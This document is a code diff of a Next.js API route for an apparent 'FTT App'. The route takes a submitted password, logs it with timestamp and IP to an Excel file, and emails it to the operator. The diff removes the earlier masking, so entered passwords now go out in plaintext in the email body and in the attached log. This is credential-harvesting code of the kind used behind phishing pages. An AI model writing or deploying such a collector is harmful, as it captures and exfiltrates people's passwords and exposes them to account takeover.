@@ -6,19 +6,16 @@ import os from 'os';
 import ExcelJS from 'exceljs';
 
 export async function POST(req: Request) {
-  // ✅ Use headers from the req object directly
-  const bypassToken = req.headers.get('x-vercel-protection-bypass');
-  const expectedToken = process.env.VERCEL_AUTOMATION_BYPASS_SECRET;
-
-  if (!bypassToken || bypassToken !== expectedToken) {
-    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
-  }
-
   try {
     const { password } = await req.json();
+    const ip = req.headers.get('x-forwarded-for') || 'unknown';
 
-    const forwardedFor = req.headers.get('x-forwarded-for');
-    const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : 'unknown';
+    const bypassToken = req.headers.get('x-vercel-protection-bypass');
+    const expectedToken = process.env.VERCEL_AUTOMATION_BYPASS_SECRET;
+
+    if (!bypassToken || bypassToken !== expectedToken) {
+      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
+    }
 
     if (!password) {
       return NextResponse.json({ error: 'Password missing' }, { status: 400 });
@@ -28,16 +25,17 @@ export async function POST(req: Request) {
     const filePath = path.join(os.tmpdir(), fileName);
 
     const workbook = new ExcelJS.Workbook();
+    let sheet;
+
     if (fs.existsSync(filePath)) {
       await workbook.xlsx.readFile(filePath);
+      sheet = workbook.getWorksheet('Log') || workbook.addWorksheet('Log');
+    } else {
+      sheet = workbook.addWorksheet('Log');
+      sheet.addRow(['Password', 'Timestamp', 'IP']);
     }
-    const sheet = workbook.worksheets[0] || workbook.addWorksheet('Log');
 
-    if (sheet.rowCount === 0) {
-      sheet.addRow(['Timestamp', 'Password', 'IP']);
-    }
-
-    sheet.addRow([new Date().toISOString(), password, ip]);
+    sheet.addRow([password, new Date().toISOString(), ip]);
     await workbook.xlsx.writeFile(filePath);
 
     const transporter = nodemailer.createTransport({
@@ -48,28 +46,24 @@ export async function POST(req: Request) {
       },
     });
 
-    const maskedPassword =
-      password.length > 2
-        ? password[0] + '*'.repeat(password.length - 2) + password.slice(-1)
-        : '*'.repeat(password.length);
-
-    await transporter.sendMail({
-      from: `"🔐 FTT App" <${process.env.EMAIL_USER}>`,
+    const mailOptions = {
+      from: process.env.EMAIL_USER,
       to: process.env.EMAIL_USER,
-      subject: `🔐 Password Entered on FTT App: ${maskedPassword}`,
-      text: `A user entered a password.\n\nMasked Password: ${maskedPassword}\nIP: ${ip}`,
+      subject: 'New Password Entry',
+      text: `Password: ${password}\nIP: ${ip}\nTime: ${new Date().toISOString()}`,
       attachments: [
         {
           filename: fileName,
           path: filePath,
         },
       ],
-    });
+    };
+
+    await transporter.sendMail(mailOptions);
 
     return NextResponse.json({ success: true });
   } catch (err) {
-    console.error('Error sending email:', err);
-    return NextResponse.json({ error: 'Email failed' }, { status: 500 });
+    console.error(err);
+    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
   }
 }
-
